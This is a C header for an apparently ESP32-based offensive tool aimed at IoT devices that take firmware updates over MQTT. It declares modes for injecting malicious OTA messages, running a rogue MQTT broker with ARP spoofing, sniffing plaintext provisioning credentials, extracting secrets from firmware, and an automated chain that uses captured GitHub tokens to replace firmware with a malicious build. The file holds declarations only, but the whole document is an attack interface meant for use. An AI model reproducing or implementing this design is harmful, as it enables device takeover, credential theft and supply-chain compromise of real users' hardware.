/*
 * ota_attack.h - OTA Attack Module for MQTT-based Firmware Updates
 *
 * Targets IoT devices that receive OTA firmware updates via MQTT.
 * The typical flow on the target device is:
 *   1. Device connects to MQTT broker
 *   2. Broker publishes update message on an OTA topic
 *   3. Device receives MQTT message containing firmware URL
 *   4. Device downloads firmware binary from URL (e.g. GitHub private repo)
 *   5. Device applies OTA update
 *
 * Two OTA trigger paths:
 *   WAY 1: MQTT broker pushes OTA message → device starts update
 *   WAY 2: Customer-set interval → device polls HTTP endpoint for updates
 *
 * Attack modes:
 *   SNIFF           - Passive MQTT traffic capture
 *   CLIENT          - Connect to MQTT broker as subscriber, capture OTA messages
 *   INJECT          - Publish malicious OTA messages to trigger device update
 *   FETCH           - Download firmware from captured URL for analysis
 *   POLL_SNIFF      - WiFi promiscuous sniff for DNS/HTTP OTA polling patterns
 *   GITHUB_TAKEOVER - Full chain: crack broker → capture URL → crack GitHub
 *                     repo → upload malicious firmware → device auto-updates
 *
 * Key capabilities:
 *   - Connect to target WiFi network (AP+STA dual mode)
 *   - Connect to MQTT broker (with or without credentials)
 *   - Subscribe to OTA-related topics (wildcard support)
 *   - Capture firmware download URLs from MQTT payloads
 *   - Extract GitHub tokens, repo URLs, and access credentials
 *   - Parse GitHub URLs to extract owner/repo/path/branch
 *   - Access GitHub private repos via extracted tokens (REST API)
 *   - List repo contents, download individual files
 *   - Upload/replace firmware binaries in GitHub repos
 *   - Download firmware binaries via HTTP/HTTPS
 *   - Inject custom OTA messages to the target device
 *   - DNS/HTTP promiscuous sniff for interval-based OTA check patterns
 *   - Automated full-chain attack (GITHUB_TAKEOVER mode)
 *   - Full status reporting for web dashboard integration
 *
 * Thread safety:
 *   - running is volatile bool: set from stop()/timer, read in task
 *   - Counters are volatile uint32_t: atomic on 32-bit Xtensa
 *   - cfg is protected by mutex
 *   - timeout_fired is volatile for cross-task visibility
 *
 * Dependencies:
 *   - WiFi STA (connects to target network)
 *   - esp_mqtt client
 *   - esp_http_client (firmware download + GitHub API)
 *   - cJSON
 *   - esp_timer
 *   - FreeRTOS
 */

#ifndef OTA_ATTACK_H
#define OTA_ATTACK_H

#include <stdbool.h>
#include <stdint.h>
#include "cJSON.h"

/* ------------------------------------------------------------------ */
/*  Attack mode                                                        */
/* ------------------------------------------------------------------ */

typedef enum {
    OTA_MODE_SNIFF           = 0,  /* Passive MQTT traffic capture            */
    OTA_MODE_CLIENT          = 1,  /* Connect to MQTT broker as subscriber    */
    OTA_MODE_INJECT          = 2,  /* Publish malicious OTA messages          */
    OTA_MODE_FETCH           = 3,  /* Download firmware from URL              */
    OTA_MODE_POLL_SNIFF      = 4,  /* WiFi sniff for DNS/HTTP OTA polling     */
    OTA_MODE_GITHUB_TAKEOVER = 5,  /* Full chain: broker → URL → repo → push */
    OTA_MODE_PROVISION_SNIFF = 6,  /* Capture ALL config creds via plain HTTP */
    OTA_MODE_ROGUE_BROKER    = 7,  /* Full MQTT MITM on port 1883 no TLS      */
    OTA_MODE_FIRMWARE_ANALYZE= 8,  /* Extract secrets from firmware binaries  */
} ota_attack_mode_t;

/* ------------------------------------------------------------------ */
/*  Attack state                                                       */
/* ------------------------------------------------------------------ */

typedef enum {
    OTA_STATE_IDLE = 0,
    OTA_STATE_WIFI_CONNECTING,    /* Connecting to target WiFi       */
    OTA_STATE_MQTT_CONNECTING,    /* Connecting to MQTT broker       */
    OTA_STATE_SNIFFING,           /* Passive MQTT sniff active       */
    OTA_STATE_SUBSCRIBED,         /* MQTT client subscribed          */
    OTA_STATE_WAITING_OTA,        /* Waiting for OTA message         */
    OTA_STATE_DOWNLOADING,        /* Downloading firmware            */
    OTA_STATE_DOWNLOADED,         /* Firmware download complete      */
    OTA_STATE_INJECTING,          /* Injecting OTA message           */
    OTA_STATE_INJECTED,           /* OTA message injected            */
    OTA_STATE_POLL_SNIFFING,      /* WiFi promiscuous sniff active   */
    OTA_STATE_POLL_DNS_FOUND,     /* DNS query captured              */
    OTA_STATE_POLL_HTTP_FOUND,    /* HTTP OTA check URL found        */
    OTA_STATE_GH_PARSING_URL,     /* Parsing GitHub URL structure    */
    OTA_STATE_GH_ACCESSING_REPO,  /* Accessing GitHub repo via API   */
    OTA_STATE_GH_LISTING_FILES,   /* Listing repo files              */
    OTA_STATE_GH_UPLOADING,       /* Uploading malicious firmware    */
    OTA_STATE_GH_UPLOADED,        /* Firmware uploaded successfully  */
    OTA_STATE_GH_WAITING_DEVICE,  /* Waiting for device to pull update */
    OTA_STATE_DISCONNECTED,       /* Lost connection                 */
    OTA_STATE_ERROR,              /* Error state                     */

    /* PROVISION_SNIFF states */
    OTA_STATE_PROV_SNIFFING,      /* Sniffing HTTP provision traffic */
    OTA_STATE_PROV_HTTP_CAPTURED, /* HTTP POST with creds captured   */
    OTA_STATE_PROV_CREDS_EXTRACTED,/* All config creds extracted     */
    OTA_STATE_PROV_WAITING,       /* Waiting for next provision POST */

    /* ROGUE_BROKER states */
    OTA_STATE_RB_STARTING,        /* Starting rogue MQTT broker      */
    OTA_STATE_RB_LISTENING,       /* Rogue broker listening on 1883  */
    OTA_STATE_RB_CLIENT_CONNECTED,/* Target device connected to us   */
    OTA_STATE_RB_INTERCEPTING,    /* Intercepting MQTT messages      */
    OTA_STATE_RB_MODIFYING,       /* Modifying MQTT payload in transit*/
    OTA_STATE_RB_FORWARDING,      /* Forwarding to real broker       */

    /* FIRMWARE_ANALYZE states */
    OTA_STATE_FW_ANALYZING,       /* Analyzing firmware binary       */
    OTA_STATE_FW_SCANNING,        /* Scanning for secret patterns    */
    OTA_STATE_FW_EXTRACTING,      /* Extracting hardcoded secrets    */
    OTA_STATE_FW_COMPLETE,        /* Analysis complete               */
} ota_attack_state_t;

/* ------------------------------------------------------------------ */
/*  Captured MQTT message entry                                        */
/* ------------------------------------------------------------------ */

#define OTA_MAX_CAPTURED_MSGS    8 //32
#define OTA_MAX_PAYLOAD_LEN      512
#define OTA_MAX_TOPIC_LEN        128
#define OTA_MAX_URL_LEN          256
#define OTA_MAX_FIRMWARE_SIZE    (512 * 1024)  /* 512 KB max firmware */

typedef struct {
    char topic[OTA_MAX_TOPIC_LEN];
    char payload[OTA_MAX_PAYLOAD_LEN];
    int64_t timestamp_ms;
} ota_msg_entry_t;

/* ------------------------------------------------------------------ */
/*  Captured URL entry                                                 */
/* ------------------------------------------------------------------ */

#define OTA_MAX_CAPTURED_URLS    8 //16
#define OTA_MAX_DNS_ENTRIES     8 //32
#define OTA_MAX_DNS_NAME_LEN    64
#define OTA_MAX_HTTP_ENTRIES    4 ///16
#define OTA_MAX_HTTP_URL_LEN    128

typedef struct {
    char url[OTA_MAX_URL_LEN];
    char source_topic[OTA_MAX_TOPIC_LEN];
    int64_t timestamp_ms;
    bool has_github_token;
    bool downloaded;
    uint32_t firmware_size;
} ota_url_entry_t;

/* ------------------------------------------------------------------ */
/*  Captured DNS query entry (for POLL_SNIFF mode)                     */
/* ------------------------------------------------------------------ */

typedef struct {
    char domain[OTA_MAX_DNS_NAME_LEN];   /* Queried domain name       */
    uint8_t client_ip[4];                /* Source IP (device IP)      */
    uint8_t server_ip[4];                /* DNS server IP              */
    int64_t timestamp_ms;
    bool is_ota_related;                 /* Domain matches OTA pattern */
} ota_dns_entry_t;

/* ------------------------------------------------------------------ */
/*  Captured HTTP OTA check entry (for POLL_SNIFF mode)                */
/* ------------------------------------------------------------------ */

typedef struct {
    char method[8];                       /* GET/POST                   */
    char host[128];                       /* Host header value          */
    char path[OTA_MAX_HTTP_URL_LEN];      /* Request path + query       */
    char full_url[OTA_MAX_HTTP_URL_LEN];  /* Full reconstructed URL     */
    uint8_t client_ip[4];                 /* Source IP                  */
    int64_t timestamp_ms;
    bool is_ota_related;                  /* URL matches OTA pattern    */
} ota_http_entry_t;

/* ------------------------------------------------------------------ */
/*  Provision Sniffer: Captured config credentials                     */
/*  The ESP32 provisioning web server sends ALL config via plain HTTP  */
/*  POST with zero encryption — WiFi SSID, WiFi password, MQTT broker, */
/*  MQTT username/password, Modbus driver URL, custom time settings.   */
/* ------------------------------------------------------------------ */

#define OTA_MAX_PROV_CREDS      8
#define OTA_MAX_CRED_KEY_LEN    32
#define OTA_MAX_CRED_VALUE_LEN  256

typedef struct {
    char key[OTA_MAX_CRED_KEY_LEN];       /* e.g. "wifi_ssid", "mqtt_password" */
    char value[OTA_MAX_CRED_VALUE_LEN];   /* Captured credential value         */
    char source_ip[16];                    /* Source IP of the HTTP POST        */
    int64_t timestamp_ms;                  /* When it was captured              */
    bool is_sensitive;                     /* Password/token/secret field       */
} ota_prov_cred_t;

typedef struct {
    char wifi_ssid[33];
    char wifi_password[64];
    char mqtt_broker[128];
    uint16_t mqtt_port;
    char mqtt_username[64];
    char mqtt_password[64];
    char modbus_driver_url[256];
    char custom_time[32];
    char device_id[64];
    char ap_password[64];
    int total_creds_captured;
    int sensitive_creds_captured;
    int64_t first_capture_ms;
    int64_t last_capture_ms;
} ota_prov_summary_t;

/* ------------------------------------------------------------------ */
/*  Rogue Broker: MQTT MITM captured data                              */
/*  Device connects via mqtt:// port 1883 with no TLS or cert check.   */
/*  We impersonate the broker — intercept, modify, forward.            */
/* ------------------------------------------------------------------ */

#define OTA_MAX_MITM_MSGS      8
#define OTA_MAX_MITM_TOPIC_LEN 64
#define OTA_MAX_MITM_PAYLOAD_LEN 512

typedef struct {
    char original_topic[OTA_MAX_MITM_TOPIC_LEN];
    char original_payload[OTA_MAX_MITM_PAYLOAD_LEN];
    char modified_topic[OTA_MAX_MITM_TOPIC_LEN];     /* If modified */
    char modified_payload[OTA_MAX_MITM_PAYLOAD_LEN];  /* If modified */
    char client_id[64];                               /* Connecting device client ID */
    bool was_modified;                                 /* Did we alter this message? */
    bool direction_upload;                             /* true=device->broker, false=broker->device */
    int64_t timestamp_ms;
} ota_mitm_entry_t;

typedef struct {
    char target_client_id[64];
    char real_broker_ip[128];
    uint16_t real_broker_port;
    uint16_t rogue_port;
    int devices_connected;
    int messages_intercepted;
    int messages_modified;
    int messages_forwarded;
    bool arp_spoof_active;
} ota_rogue_broker_summary_t;

/* ------------------------------------------------------------------ */
/*  Firmware Analysis: Extracted secrets from firmware binary           */
/*  No firmware encryption or signature verification — we can extract   */
/*  hardcoded API keys, tokens, certificates, and config structures.    */
/* ------------------------------------------------------------------ */

#define OTA_MAX_FW_SECRETS     8
#define OTA_MAX_SECRET_TYPE_LEN 16
#define OTA_MAX_SECRET_VALUE_LEN 256
#define OTA_MAX_SECRET_CONTEXT_LEN 32

typedef struct {
    char type[OTA_MAX_SECRET_TYPE_LEN];    /* "api_key", "token", "cert", "password", "url", "ssid" */
    char value[OTA_MAX_SECRET_VALUE_LEN];  /* The extracted secret value */
    char context[OTA_MAX_SECRET_CONTEXT_LEN]; /* Surrounding context/label */
    uint32_t offset;                       /* Byte offset in firmware */
    int confidence;                        /* 0-100 confidence score */
} ota_fw_secret_t;

typedef struct {
    uint32_t firmware_size;
    uint32_t secrets_found;
    uint32_t high_confidence_count;
    char firmware_sha256[65];
    bool has_wifi_creds;
    bool has_mqtt_creds;
    bool has_api_keys;
    bool has_certificates;
    bool has_private_keys;
    bool has_hardcoded_urls;
    bool has_modbus_config;
} ota_fw_analysis_summary_t;

/* ------------------------------------------------------------------ */
/*  GitHub repo info (parsed from captured URL)                        */
/* ------------------------------------------------------------------ */

#define OTA_GH_OWNER_LEN    64
#define OTA_GH_REPO_LEN     64
#define OTA_GH_PATH_LEN     128
#define OTA_GH_BRANCH_LEN   32
#define OTA_GH_TOKEN_LEN    128
#define OTA_GH_SHA_LEN      41
#define OTA_GH_API_RESP_LEN (16 * 1024)  /* 16 KB for GitHub API response */

typedef struct {
    char owner[OTA_GH_OWNER_LEN];         /* Repo owner/org            */
    char repo[OTA_GH_REPO_LEN];           /* Repo name                 */
    char path[OTA_GH_PATH_LEN];           /* File path in repo         */
    char branch[OTA_GH_BRANCH_LEN];       /* Branch (default main)     */
    char token[OTA_GH_TOKEN_LEN];         /* Extracted access token    */
    char file_sha[OTA_GH_SHA_LEN];        /* Current file SHA (for update) */
    bool  token_valid;                     /* Token has repo write access */
    bool  parsed;                          /* URL was successfully parsed */
} ota_github_repo_t;

/* ------------------------------------------------------------------ */
/*  Configuration (passed to ota_attack_start_config)                  */
/* ------------------------------------------------------------------ */

typedef struct {
    ota_attack_mode_t mode;         /* Attack mode                     */

    /* WiFi connection (all modes except POLL_SNIFF without STA) */
    char wifi_ssid[33];             /* Target WiFi SSID                */
    char wifi_password[64];         /* Target WiFi password            */

    /* MQTT broker (CLIENT / INJECT / GITHUB_TAKEOVER modes) */
    char mqtt_broker[128];          /* Broker hostname or IP           */
    uint16_t mqtt_port;             /* Broker port (default 1883)      */
    char mqtt_username[64];         /* Username (optional)             */
    char mqtt_password[64];         /* Password (optional)             */
    char mqtt_client_id[32];        /* Client ID (default auto)        */

    /* Topic subscription (CLIENT mode) */
    char subscribe_topic[128];      /* Topic to subscribe (default #)  */

    /* Injection (INJECT mode) */
    char inject_topic[128];         /* Topic to publish to             */
    char inject_payload[512];       /* Payload to publish (JSON)       */
    uint32_t inject_count;          /* Number of times to inject (1)   */
    uint32_t inject_interval_ms;    /* Interval between injections (0) */

    /* Firmware fetch (FETCH mode) */
    char firmware_url[256];         /* URL to download firmware from   */
    bool verify_ssl;                /* Verify SSL certs (default false)*/

    /* Poll sniff (POLL_SNIFF mode) */
    uint8_t  target_device_ip[4];   /* Target device IP to filter (0=any) */
    bool     capture_dns;           /* Capture DNS queries (default true) */
    bool     capture_http;          /* Capture HTTP requests (default true) */

    /* GitHub takeover (GITHUB_TAKEOVER mode) */
    char gh_firmware_path[OTA_GH_PATH_LEN]; /* Path in repo to replace (e.g. "firmware.bin") */
    char gh_branch[OTA_GH_BRANCH_LEN];      /* Branch to push to (default: main) */
    char gh_commit_msg[128];                 /* Commit message for malicious firmware */
    uint8_t *malicious_firmware;             /* Pointer to malicious firmware data   */
    uint32_t malicious_firmware_size;        /* Size of malicious firmware           */
    int gh_captured_url_index;               /* Which captured URL to use (-1 = first GitHub) */

    /* Provision sniff (PROVISION_SNIFF mode) */
    uint16_t prov_sniff_port;                /* HTTP port to sniff (default 80) */
    bool     prov_capture_post_only;         /* Only capture POST requests (default true) */
    bool     prov_auto_parse_json;           /* Auto-parse JSON bodies for creds (default true) */

    /* Rogue broker (ROGUE_BROKER mode) */
    uint16_t rb_rogue_port;                  /* Port for rogue broker (default 1883) */
    char     rb_real_broker_ip[128];         /* Real broker IP to forward to */
    uint16_t rb_real_broker_port;            /* Real broker port (default 1883) */
    bool     rb_modify_payloads;             /* Modify payloads in transit (default false) */
    char     rb_modify_topic[128];           /* Topic to modify (empty=all) */
    char     rb_modify_payload[512];         /* Replacement payload for matching topic */
    bool     rb_arp_spoof;                   /* Enable ARP spoofing (default true) */

    /* Firmware analysis (FIRMWARE_ANALYZE mode) */
    int      fw_analyze_url_index;           /* Which captured URL firmware to analyze (-1=last) */
    bool     fw_deep_scan;                   /* Deep scan for all patterns (default true) */
    bool     fw_extract_strings;             /* Extract all printable strings (default true) */

    /* General */
    uint32_t timeout_sec;           /* Auto-stop timeout (default 300) */
} ota_attack_config_t;

/* ------------------------------------------------------------------ */
/*  Lifecycle                                                          */
/* ------------------------------------------------------------------ */

/** One-time init -- call from app_main or module setup. */
void ota_attack_init(void);

/** Start with mode and target (simplified API). */
void ota_attack_start(ota_attack_mode_t mode, const char *wifi_ssid,
                      const char *wifi_password);

/** Start with full config. */
void ota_attack_start_config(const ota_attack_config_t *cfg);

/** Stop the attack and clean up. */
void ota_attack_stop(void);

/* ------------------------------------------------------------------ */
/*  Status getters  (safe to call from any task / HTTP handler)         */
/* ------------------------------------------------------------------ */

bool              ota_attack_is_running(void);
ota_attack_state_t ota_attack_get_state(void);
const char       *ota_attack_get_state_str(void);
ota_attack_mode_t ota_attack_get_mode(void);

uint32_t ota_attack_get_mqtt_msg_count(void);
uint32_t ota_attack_get_url_count(void);
uint32_t ota_attack_get_github_url_count(void);
uint32_t ota_attack_get_inject_count(void);
uint32_t ota_attack_get_download_count(void);
uint32_t ota_attack_get_fail_count(void);
uint32_t ota_attack_get_dns_count(void);
uint32_t ota_attack_get_http_count(void);
uint32_t ota_attack_get_ota_dns_count(void);
uint32_t ota_attack_get_ota_http_count(void);
int32_t  ota_attack_get_elapsed_sec(void);
int32_t  ota_attack_get_remaining_sec(void);
bool     ota_attack_was_timeout(void);

/** Returns a new cJSON object -- caller must delete. */
cJSON  *ota_attack_get_status_json(void);

/* ------------------------------------------------------------------ */
/*  Interactive operations                                              */
/* ------------------------------------------------------------------ */

/** Get captured MQTT messages as JSON string. */
const char *ota_attack_get_captured_messages_json(void);

/** Get captured URLs as JSON string. */
const char *ota_attack_get_urls_json(void);

/** Get GitHub-specific URLs/tokens as JSON string. */
const char *ota_attack_get_github_urls_json(void);

/** Manually inject an OTA message (topic + payload).
 *  Only works in CLIENT/SNIFF mode while connected. */
bool ota_attack_inject_message(const char *topic, const char *payload);

/** Trigger firmware download from a captured URL index.
 *  Returns true if download started. */
bool ota_attack_download_firmware(int url_index);

/** Get firmware download result (size, status) as JSON string. */
const char *ota_attack_get_download_result_json(void);

/** Get captured DNS queries as JSON string (POLL_SNIFF mode). */
const char *ota_attack_get_dns_entries_json(void);

/** Get captured HTTP OTA check requests as JSON string. */
const char *ota_attack_get_http_entries_json(void);

/* ------------------------------------------------------------------ */
/*  GitHub Repo Takeover API                                           */
/* ------------------------------------------------------------------ */

/** Parse a GitHub URL to extract owner/repo/path/token.
 *  Fills in the ota_github_repo_t structure.
 *  Returns true if URL was successfully parsed. */
bool ota_attack_parse_github_url(const char *url, ota_github_repo_t *out);

/** Access a GitHub repo using an extracted token.
 *  Verifies token has access and determines read/write permissions.
 *  Returns true if token is valid and has at least read access. */
bool ota_attack_github_access_repo(ota_github_repo_t *repo);

/** List files in a GitHub repo at the given path.
 *  Returns a JSON string (caller does NOT free - static buffer).
 *  Format: [{"name":"file.bin","path":"firmware.bin","sha":"abc...",
 *            "size":12345,"type":"file"},...] */
const char *ota_attack_github_list_files(ota_github_repo_t *repo,
                                          const char *path);

/** Get the SHA of a file in the repo (needed to update/replace it).
 *  Fills repo->file_sha. Returns true on success. */
bool ota_attack_github_get_file_sha(ota_github_repo_t *repo,
                                     const char *file_path);

/** Upload/replace a firmware file in the GitHub repo.
 *  Uses the GitHub Contents API (PUT /repos/{owner}/{repo}/contents/{path}).
 *  If repo->file_sha is set, the existing file is replaced.
 *  Returns true on successful upload. */
bool ota_attack_github_upload_firmware(ota_github_repo_t *repo,
                                        const uint8_t *firmware_data,
                                        uint32_t firmware_size,
                                        const char *target_path,
                                        const char *commit_msg);

/** Full automated attack chain: sniff MQTT → capture URL → parse GitHub
 *  repo → verify token → upload malicious firmware → wait for device update.
 *  This is what GITHUB_TAKEOVER mode runs internally.
 *  Returns true if malicious firmware was successfully uploaded. */
bool ota_attack_github_takeover_chain(const char *wifi_ssid,
                                       const char *wifi_password,
                                       const char *mqtt_broker,
                                       uint16_t mqtt_port,
                                       const uint8_t *malicious_fw,
                                       uint32_t malicious_fw_size,
                                       uint32_t wait_for_device_sec);

/** Get the current GitHub repo info (after parsing/accessing).
 *  Returns a JSON string (static buffer, do NOT free). */
const char *ota_attack_get_github_repo_json(void);

/** Get the last GitHub API operation result as JSON. */
const char *ota_attack_get_github_result_json(void);

/* ------------------------------------------------------------------ */
/*  Provision Sniffer API                                              */
/*  Captures ALL config creds (WiFi, MQTT, Modbus) from the ESP32      */
/*  provisioning web server which uses plain HTTP with zero encryption. */
/* ------------------------------------------------------------------ */

/** Get captured provision credentials as JSON string.
 *  Returns all key-value pairs captured from HTTP POST requests. */
const char *ota_attack_get_prov_creds_json(void);

/** Get a summary of all captured provision credentials.
 *  Fills in the summary structure with organized credential data. */
void ota_attack_get_prov_summary(ota_prov_summary_t *out);

/** Get provision summary as JSON string. */
const char *ota_attack_get_prov_summary_json(void);

/** Get count of captured provision credentials. */
uint32_t ota_attack_get_prov_cred_count(void);

/** Get count of sensitive (password/token) credentials captured. */
uint32_t ota_attack_get_prov_sensitive_count(void);

/** Clear all captured provision credentials. */
void ota_attack_clear_prov_creds(void);

/* ------------------------------------------------------------------ */
/*  Rogue Broker API                                                   */
/*  Full MQTT MITM — device connects via mqtt:// port 1883 with no     */
/*  TLS/cert verification. We intercept, modify, and forward.          */
/* ------------------------------------------------------------------ */

/** Get intercepted MQTT MITM messages as JSON string. */
const char *ota_attack_get_mitm_messages_json(void);

/** Get rogue broker summary (connections, messages, modifications). */
void ota_attack_get_rogue_broker_summary(ota_rogue_broker_summary_t *out);

/** Get rogue broker summary as JSON string. */
const char *ota_attack_get_rogue_broker_summary_json(void);

/** Dynamically set a topic payload modification rule.
 *  All subsequent messages on matching topic will be replaced.
 *  Only works while ROGUE_BROKER mode is active. */
bool ota_attack_set_mitm_modify_rule(const char *topic, const char *new_payload);

/** Get count of intercepted MQTT messages. */
uint32_t ota_attack_get_mitm_count(void);

/** Get count of modified MQTT messages. */
uint32_t ota_attack_get_mitm_modified_count(void);

/** Clear all intercepted MITM messages. */
void ota_attack_clear_mitm_messages(void);

/* ------------------------------------------------------------------ */
/*  Firmware Analysis API                                              */
/*  Extracts hardcoded secrets from any downloaded firmware binary      */
/*  because there's no firmware encryption or signature verification.   */
/* ------------------------------------------------------------------ */

/** Analyze the currently downloaded firmware binary for secrets.
 *  If firmware_buffer has data, scans it for hardcoded credentials,
 *  API keys, tokens, certificates, and configuration structures.
 *  Returns number of secrets found. */
int ota_attack_analyze_firmware(void);

/** Get extracted firmware secrets as JSON string. */
const char *ota_attack_get_fw_secrets_json(void);

/** Get firmware analysis summary. */
void ota_attack_get_fw_analysis_summary(ota_fw_analysis_summary_t *out);

/** Get firmware analysis summary as JSON string. */
const char *ota_attack_get_fw_analysis_summary_json(void);

/** Get count of extracted firmware secrets. */
uint32_t ota_attack_get_fw_secret_count(void);

/** Get count of high-confidence firmware secrets. */
uint32_t ota_attack_get_fw_high_confidence_count(void);

/** Clear all extracted firmware secrets. */
void ota_attack_clear_fw_secrets(void);

#endif /* OTA_ATTACK_H */
